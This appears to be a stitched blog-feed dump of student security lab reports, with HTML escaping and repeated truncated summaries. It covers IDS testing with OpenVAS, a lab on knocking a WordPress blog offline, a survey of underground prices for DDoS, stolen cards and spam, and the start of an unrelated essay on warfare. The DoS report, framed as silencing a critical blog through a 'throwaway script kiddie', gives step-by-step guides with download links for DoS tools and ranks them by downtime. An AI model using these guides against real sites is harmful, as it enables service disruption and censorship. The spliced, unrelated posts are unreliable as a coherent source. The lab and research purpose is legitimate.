    test -e /var/lib/openvas/CA/cacert.pem || sudo openvas-mkcert -qsudo openvas-nvt-sync test -e /var/lib/openvas/users/om || sudo openvas-mkcert-client -n om -i sudo /etc/init.d/openvas-manager stopsudo /etc/init.d/openvas-scanner stopsudo openvassdsudo openvasmd --migratesudo openvasmd --rebuildsudo killall openvassdsleep 15sudo /etc/init.d/openvas-scanner startsudo /etc/init.d/openvas-manager startsudo /etc/init.d/openvas-administrator restartsudo /etc/init.d/greenbone-security-assistant restarttest -e /var/lib/openvas/users/admin || sudo openvasad -c add_user -n admin -r Admin

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 4: Log into OpenVAS as “admin”&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Open &lt;code&gt;https://localhost:9392/&lt;/code&gt; or start &lt;code&gt;“gsd”&lt;/code&gt; on a command line as a
regular user (not as root!). Optional we can use and the Slowloris and
Pyloris DoS attacks.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Download link for Slowloris is:
&lt;a href="http://ha.ckers.org/slowloris/slowloris.pl"&gt;http://ha.ckers.org/slowloris/slowloris.pl&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The above solution and tool will help us to check and test our IDS
system usefulness. It tests the following attacks: Port scan, SYN flood,
DoS, etc. The results are presented with nice GUI interface. For more
info about the project please refer to
&lt;a href="http://www.openvas.org/"&gt;www.openvas.org&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After executing the above proposal we will highlight the results.
Nevertheless, only the Proposal 1 was able to run the test. Others two,
Proposal 2 and Proposal 3 were unsuccessful of installation process and
configuration and to run the attacks. Moreover, the result are presented
from the total amount of reports, registered alerts in the snort. This
is done by help of web interface of Basic Analysis and Security Engine
in addition Analysis Console for Intrusion Databases (ACID) project tool
[ACID]. Therefore, the result from the Proposal 1 and from the rest are
highlighted below:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Proposal 1&lt;/li&gt;
&lt;li&gt;DoS – registered alerts: 2;&lt;/li&gt;
&lt;li&gt;Port scan : 8;&lt;/li&gt;
&lt;li&gt;synf.sh: 1344;&lt;/li&gt;
&lt;li&gt;slowloris.pl: 1782;&lt;/li&gt;
&lt;li&gt;
&lt;/p&gt;

&lt;p&gt;apachekiller.pl: not working;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;Proposal 2&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;pytbull: 0, the message was: Error: FTP error, 550 failed to open
file.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;Proposal 3&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   Too complicated to be configured and installed. The instructions and
the procedures should be more easy. After few hours of configuring
and test, tweaks are is still not working. Yet there are many good
tutorials how to configure OpenVAS please refer [OpenVas1] and
[OpenVas2].&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Primarily, setting-up IDS, the Snort, it is not an easy task to
complete. On the other hand, configuring, installing, etc. the testing
tools for IDS system is even more complicated. Therefore, the Proposal 1
has the best solution and installation process of the test tools.
Despite, that it was the only one that worked. Finally, recommendation
for the IDS solutions and in addition to the penetrating tools to test
the usefulness of IDS has to be more simple and stepwise solution.
However, the above scenario and proposals are great tools and solutions
for a future reader.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to make effort to attack server and
to deface website. Here is the scenario: your client is worried about
some stuff posted on a blog. They ask You to take care of it. They have
a throwaway “script kiddie”[Script …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE and SCENARIO&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to make effort to attack server and
to deface website. Here is the scenario: your client is worried about
some stuff posted on a blog. They ask You to take care of it. They have
a throwaway “script kiddie”[Script kiddie] in a third world country, who
will mount the attack so You don’t need to worry about hiding the
attackers identity.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to devise a way to attack wordpress (default
installation) based site to render it unusable (page view times over 60
seconds). Attack resources: one PC with Microsoft Windows XP, a script
kiddie, internet connection of 2Mbit/s. In addition, server has to stay
down for two days and script kiddie has up to 1 day to set up the
attack.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For scenario above their three different proposals from the fallow
students. Each proposal is described in section Proposals and their
effectiveness, installation process and the evaluation of the efficient
use of available resources.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, easy solution for limiting the internet connection of 2Mbit/s
by Oracle VirtualBox configuration manager. Secondly, the bandwidth
capacity of the connection and their performance is measured by vnstat1
for graphs to display our utilization. The steps are vivid on section
Methods.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, providing measurement results with different proposals will
help us to identify the most beneficial proposal for above scenario,
declared in Conclusion section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, after each attack, test the virtual server environment is
restarted, because of the affective situation that server after attack
needs time to recover.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;METHODS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Because of requirements of our scenario we need to limit the internet
connection of 2 Mbit/s and to provide graphs that can help as with the
measurement results to conclude which proposals is more competent.
Therefore, Method 1 is describing the step how we limited the connection
bandwidth and Method 2 providing as solution how to setup that can help
you in measuring the speed and the bandwidth.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;For limiting the internet traffic of the server we have to do the
following steps in command prompt. The following solution is gathered
from Manual of Oracle Virtualbox, Chapter 8 [User Manual].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Limiting VirtualBox – virtual environment speed of network interface:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    VBoxManage modifyvm "[name of virtualbox]" --nicspeed2 2048

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Where you need to replace name of virtual box with real one, and specie
which network interface adapter you wont to limited. In the above
illustration is only second network adapter affected and then you set
the limitation, in our case is 2 Mbit/s.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, to make sure that the result have been effective please use
the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    VBoxManage showvminfo "[name of virtualbox]"

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Results and information important to be aware refer to Appendix 1.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;We are going to install an application that will help us to gather a
visual graphs of traffic manipulation of script kiddie. The application
is vnstat.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In the server virtual environment in command prompt please type the
following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo apt-get install vnstat&lt;br&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Next step is to select which interface should be monitored and create
graphs. In our case is eth1, which is second network interface. For
furthermore detailed installation process please refer to the following
link:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.4geeksfromnet.com/2009/04/graphical-bandwidth-monitor-for-ubuntu.html"&gt;http://www.4geeksfromnet.com/2009/04/graphical-bandwidth-monitor-for-ubuntu.html&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To check if the installation process is finished please use your
browser, as shown in illustration 1 and on the address bar type:
http://192.168.56.102/vnstat&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Vnstat PHP interface&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The three proposals are following and described in each different
section and their results. The main measure goal which is going to grate
for kiddie script is: easy to use instructions, the most efficient use
of available resources and can the script be up to 1 day attacking.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the results will be provided with two different graphs in
period of 5 minutes attack and 10 minutes attack. Which would guide us
to compare which kiddie script has performed the attack more in force.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;This is the first proposal and the installation process instruction:
Script kiddie uses a little program to connection flood the WordPress
installation! The program uses Apache autobench to take the site down in
seconds.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Guide for the scipt Kiddie:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Download the program from
    &lt;a href="http://enos.itcollege.ee/~avein/anti2.rar"&gt;http://enos.itcollege.ee/~avein/anti2.rar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Unpack and run AntiXakkerv2.0.exe&lt;/li&gt;
&lt;li&gt;Enter the address for wordpress site and press the button&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Above script did no run/work on the VirtualMachine Windows XP.
Therefore, from the same author we have other solution:&lt;/p&gt;
&lt;p&gt;​1. Download
&lt;a href="http://enos.itcollege.ee/%7Eavein/anti.exe"&gt;http://enos.itcollege.ee/\~avein/anti.exe&lt;/a&gt;,
save it on Desktop&lt;/p&gt;
&lt;p&gt;​2. Open Start menu, select run and type “cmd” into the box and press
enter&lt;/p&gt;
&lt;p&gt;​3. Drag anti.exe file to the black box (commandline) , select the box
and type the address of your server ( eg. www.delfi.ee ) after the
anti.exe&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For example, if the address for your webserver is 192.168.56.101 type
the following:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    anti.exe 192.168.56.101&lt;br&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Press enter and the site will go down very soon :=) P.S. This is
    lightweight version tat doesnot use much bandwith and is targeted
    against a bug in apache server :)&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h3&gt;RESULT 1&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;After running the first proposal we can see that the script kiddie does
attack the server, but the server was reachable after a bit long delay,
but still we could access to the wordpress.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Here are some results graphs.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;5 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 2: Proposal 1, 5 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;10 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Proposal 1, 10 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the one hand the script kiddie did attack the server, but on the
other hand the server was still accessible. I’d like to conclude by
stating that the above script did not meet our needs, and it did not
stop, bring down the response time of the server.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Second proposal and the installation process:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You (Script kiddie) download the file from &lt;a href="http://share.ee/x49176f"&gt;http://share.ee/x49176f&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You will get an warning message, but you continue to download anyway&lt;/li&gt;
&lt;li&gt;In chrome it looks like this&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Execute the file&lt;/li&gt;
&lt;li&gt;Will get a warning but continue&lt;/li&gt;
&lt;li&gt;Will look something like this&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Insert the URL to attack and define how long you want to attack&lt;/li&gt;
&lt;li&gt;Will look like&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Enjoy&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;The script is basic vbscript that will overwhelm the server by as many
connections that are required to keep the server down for as long as you
define.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The above script did not work on the laboratory performance, because it
had an code error. Therefore, for this proposal we are not able to
provide you with the result graphs&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Third proposal and the installation process is listed below: There is a
free and very easy Denial of service script written in PHP, called
Keep-Dead (Version 1.14). You can download it from the following link:
&lt;a href="http://www.esrun.co.uk/blog/imp/2011/03/Keep-Dead.zip"&gt;http://www.esrun.co.uk/blog/imp/2011/03/Keep-Dead.zip&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is developed for a research purpose, but still we can use it for our
scenario. The good think is primarily meant for use via the terminal;
although it will also work if launched via the browser.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Unpack the Keep-Dead.zip&lt;/li&gt;
&lt;li&gt;Open in notepad or any other text/script editor&lt;/li&gt;
&lt;li&gt;On line #26 change the
    &lt;code&gt;$target_url = “http://www.example.com/wordpress/?s=%rand%”;&lt;/code&gt; to our
    targeted wordpress blog. We can stop even certain page or post in
    wordpres or use of &lt;code&gt;%rand%&lt;/code&gt; for a random value to be automatically
    generated for each individual request • You can change the maximum
    number of requests to be made on line #32&lt;/li&gt;
&lt;li&gt;Changeable is maximum number of requests to be made per connection
    #37, etc.&lt;/li&gt;
&lt;li&gt;After setting the setting of our needs save the file.&lt;/li&gt;
&lt;li&gt;And in terminal you need to run the following script:
    &lt;code&gt;php –e keep-dead.php&lt;/code&gt; or if you run a xamp or other webserver it is
    possible to run the script from your browser.&lt;/li&gt;
&lt;li&gt;You can terminate the script by pressing CTRL+C in terminal console
    or stop/close the browser.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;For more information or video tutorials please refer to the following
link: &lt;a href="http://www.esrun.co.uk/blog/keep-alive-dos-script/"&gt;http://www.esrun.co.uk/blog/keep-alive-dos-script/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;If we follow the above steps we can perform our scenario 3 to make the
server to stay down for two days or even more.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There many ways to keep the server down for two days, this script for me
is kind of easy usable. In addition, the author had provide and more
details with following content: In addition of my proposal pls install
the following script:
&lt;a href="http://windows.php.net/downloads/releases/php-5.3.8-nts-Win32-VC9-x86.msi"&gt;http://windows.php.net/downloads/releases/php-5.3.8-nts-Win32-VC9-x86.msi&lt;/a&gt;
in the installation process in the section of Select Web Server you wish
to setup please chose Do not setup a web server -&gt; Next click on the
PHP small narrow down icon and select Entire future will be installed on
local hard drive (second option) -&gt; Next -&gt;Install&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The results and graphs of the above proposal are demonstrated in the
next section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;This is the script that actually does the job and it keeps the server
down until the script is down.&lt;/p&gt;
&lt;/p&gt;

&lt;h3&gt;RESULT 3&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Test results are following:&lt;/p&gt;
&lt;p&gt;​1. 5 minutes attack&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 4: Proposal 3, 5 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;10 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 5: Proposal 3, 10 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A case in point is that from the above graphs we can see that the server
does get more traffic and it does get attacked by the script kiddie.
Illustration 6, bellow demonstrated that actually the server is down, is
not responding any more to requests.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 6: Proposal 3, server down after trying to reach the blog&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;There are three points that we should consider and to see which proposal
was more accurate and it did the job that was required in the scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First I would like to start with rating from 1 to 5 each proposal.
Higher score present better results. Which is proving our destination to
hold down the server for longer then one day. The bellow table
demonstrates which proposal has succeed.&lt;/p&gt;
&lt;/p&gt;

&lt;table&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;thead&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th&gt;
&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="center"&gt;
Proposal 1

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="center"&gt;
Proposal 2

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="right"&gt;
Proposal 3

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/thead&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tbody&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
Easy installation

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
5

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
5

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;
4

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
Server down

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
3

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
1

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;
5

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
TOTAL

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
8

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
6

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;
9

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tbody&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/table&gt;

&lt;/p&gt;

&lt;p&gt;On the scoring rate 3 of server down is means that the server was down,
but after few seconds was retrievable. Where the highest score 5 means
that the server was not retrievable during this proposal test until we
shutdown or cancel the process of script kiddie. In addition, the
Proposal 3 due to a code error was not able to perform attack, that is
why it is graded with server down score of 1. Therefore, our winner for
this laboratory test is Proposal 3 with script kiddie Keep-dead.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The next issue that I would like to focus is to the network speed,
tested with other tool bmon2 which manifests that the speed limit of the
bandwidth did not go over the 2 Mbit/s.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, the above proposals are nice and good example to have an
view of how and with what tools we should perform script kiddie
techniques. How to shutdown access to a server. On the whole, it show as
how to use tools and methods of measuring the bandwidth of network and
how to limit the transfer in comfortable way.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is connected with the Method 1, which highlighted points are
illustration on what information we should check, to clarify that the
virtual environment has limitation of the network interface. Where
Appendix 2 is for installation process of Ubuntu Server 10.04 LTS and
wordpress, mysql installation.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 1&lt;/h1&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the costs of nowadays
most known attack  DDOS, leak of credit card numbers, infected machine
and never the less sending spam for 1 000 000 (one million) people.
There are few points that should be presented:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Where did we discovered …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the costs of nowadays
most known attack  DDOS, leak of credit card numbers, infected machine
and never the less sending spam for 1 000 000 (one million) people.
There are few points that should be presented:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Where did we discovered the information (links or sources)&lt;/li&gt;
&lt;li&gt;What kind of source of communication we used, for instance: instant
    messing, ICQ, IRC, which contact we have gather the information&lt;/li&gt;
&lt;li&gt;What are the prices for the above attacks.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;First of all, we must bear in mind that collecting the above information
it is presented to a numerous affected sources ( i.e. Website, news,
forums, IRC chat,etc.). By visiting the source can lead you to a virus,
trojan, malicious code, malware, etc. Which can damage your system.
Therefore, we are going to use virtual environment to find our demands.
In addition, we will use different languages and different search
engines.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Construction of report is separated by tasks section. Where each section
is presented with the source, communication type and the costs of the
service. In addition, in Appendix 1 we give the configuration of virtual
environment.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of all collected data will be concise in
conclusion section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;TASKS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Following list is the numeration of the tasks:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;DDoS&lt;/li&gt;
&lt;li&gt;Credit Card Numbers&lt;/li&gt;
&lt;li&gt;Infected Machines&lt;/li&gt;
&lt;li&gt;Spam for 1 000 000 people&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Source where we can find information about the cost of DDoS attacks are
provided in Russian most known [Hackzone] forum. This is the source will
give as more of the answers. But again be careful when you accessing
this site. It is on your own risk.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the following link we received an information about DDoS
attacks: [HackzoneDDoS]. With the following translated statement:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    The average price of service from $ 50 per day. Depends on the complexity of the &lt;em&gt;attacked site. Methods of payment accepted via WebMoney. The network is practically around the clock!Commands:http / https / icmp / post / syn / udp /Price:Day from $ 50Week from $ 350From $ 1200 per month(Prices may change depending of type and timing of orders on the complexity of the attacked site)Demo test for 5-10 minutes.Contact:Icq :20-**-29Inspections completed:hack-world.orgwww.xaker.nameforum.xaknet.ruMost of the DDoS attack service are around per day $ 50, here is an other source and contact details:Contact details Icq:22-**-327Icq:875-**3E-mail:anti**os@jab**r.ru

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above information is from the following link:
&lt;a href="http://www.hackzone.ru/forum/open/id/15608/"&gt;http://www.hackzone.ru/forum/open/id/15608/&lt;/a&gt;. Other sources that can be
found are with&lt;/p&gt;
&lt;p&gt;the following links: &lt;a href="http://www.hackzone.ru/forum/open/id/16067/"&gt;http://www.hackzone.ru/forum/open/id/16067/&lt;/a&gt; and
&lt;a href="http://www.hackzone.ru/forum/open/id/17187/"&gt;http://www.hackzone.ru/forum/open/id/17187/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As we stated above that the price is from \$50 per day and it goes until
\$350 per month and so on.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;The number of credit cards leaked in the web are numerous amount. The
prices are not that high as people expected. For card that comes from
European country is the highest price and for the other are much
cheaper.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Here some information from the following link, leak from &lt;a href="http://www.hackzone.ru/memb/view/name/Support_BM/"&gt;Support_BM
Originar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;source is in Russian language, so for this report is translated to
English. From the source [CartNumber].&lt;/p&gt;
&lt;/p&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;h2&gt;TASK 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays it is not hard to find an infected machine/computer. Because
most of the user PC’s are based with operating system Windows and are
most of them infected. I have try so hard to find infected machine
price, but until today, I did not come up with any good source.
Therefore, I would like if it is possible to add this source and discuss
this source and information with the fellow students.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 4&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Spamming for one million people it sounds impossible, but still out
there someone is offering this service. Here is from Kazakhstan source
with the following information, translated in English:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    E-mail newsletter:1 post = 1 m., minimum order 10 000 posts.For large orders – big discounts!At present there is action: 10 000 tenge, we send 20 000 messages. + Action: 50 000 tenge, we send your letter to 360 000 email ardesov in Almaty, send 3 times in one month!The action is over, send a time.E-mail database:In Almaty:60 000 LEGAL Address – Almaty Yuredicheskie email addresses, the entire directory guide “our town” and directory site “Samruk Kazyna”430 000 – private address Almaty residents collected via mail search agent criteria:country, city, gender, age.Throughout Kazakhstan:240 000 – LEGAL person Kazakhstan LLP, Ltd., Inc., Ltd., etc. collected from various references such as “yellow pages” “compass” etc.3.4 million – individuals, all of Kazakhstan. – Collected through the mail search agent criteria: country, city, gender, age.P.S. you can build a base of email addresses to any city in Kazakhstan, or any other city in any other country, can you give us the criteria and we will collect your base, an example of criteria:I try, the city, Age, sex, online, not online.P.S. Legal mailings are engaged for 3 years, dispatching more than 5 years.To Order: +7-701-1**5575, +7 (727) -329-61-**.E-mail: d**z@i**ox.ru

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Indeed, for 10 000 KZT = 67.45 USD and the amount of message send are 20
000 spam. Then the price for one million spam is 3.372.5 USD without
discount. The above links is from the following source [Rassilka.kz].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;I would like to generalize that from the above information we see that
for any service that we looked for, it has a price. Value that are
different in other countries and currencies. Yet, before you start this
research make sure that you are not using your local machine.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likewise, I have used an virtual environment to be able to collect all
the above data. Because the sites, forums, links, etc. are infected with
malicious code, or can be easily traceable.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, we utter gather as much as possible different sources and
different prices. Most expensive is the spam for one million people,
second is DDoS attacks and never the last is to gain an credit card
numbers from different countries and different price.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For more info please refer to following source [QuinStreet Inc] why I
have chose Russia as the main source.&lt;/p&gt;

What are the most significant changes? What has remained unchanged?&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Before we start the discussion about the major changes in warfare from
antiquity to present day we will precede with definition of War and its
significant and remained unchanged …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Analyse the major changes in warfare from antiquity to modern days. What are the most significant changes? What has remained unchanged?&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Before we start the discussion about the major changes in warfare from
antiquity to present day we will precede with definition of War and its
significant and remained unchanged changes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;WAR in its literal meaning is fighting, for fighting alone is the
efficient principle in the manifold activity which, in a wide sense, is
called war. But fighting is a trial of strength of the moral and
physical forces by means of the latter. That the moral cannot be omitted
is evident of itself, for the condition of the mind has always the most
decisive influence on the forces employed in war (Graham, 2002).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Humanity has wedged war since antiquity through nowadays for million
causes, national and religious freedom, hatred, grudge, human rights,
liberating the enslaved etc. But one principle in war has always been
present from the depths of history till today, that is, wars are fought
for one purpose only, conquest of new territory from which economic
benefit is to be acquired for the soul use of the conqueror. Nowhere is
this more obvious than in the armed clashes of the beginning of the XXI
century, when under the pretext of human rights countries are being
robed from their natural resources and air-raids are killing those whom
should protect.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After we met with the theory of war and moral principles, it is time to
consider changes that have occurred between the ancient and modern
times. The military of ancient Egypt had introduced the new technologies
of metal, where they used bronze in the Middle Kingdom as main weapons
source, after it changed to iron in the New Kingdom and all during the
Late Dynastic Period. The Old Kingdom soldiers were equipped with a
great variety of weapons: shields, spears, cudgels, maces, daggers, bows
and arrows. The New Kingdom carried spears, battle axes, sickleswords
(MdC transliteration: xpS – khepesh or khopesh) and daggers. After the
bowmen, either on foot or on chariots, had softened up the enemy forces
with a shower of arrows (Dollinger, Dynasties XVIII to XX, 2004), the
infantry would rush in, breaking their ranks with hand weapons, maces
with wooden handles and stone – later metal – heads, battle axes,
hatchets, clubs, swords, sickleswords and daggers (Dollinger, Weapons,
2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Persian Army had only three wars, started from 490 BC until 478BC, the
army was very multicultural, were organizes in a decimal basis,
regiments, units and corps were grouped in tens, hundreds and thousands
(Drury, 2006). Officers were being responsible for ten men, another for
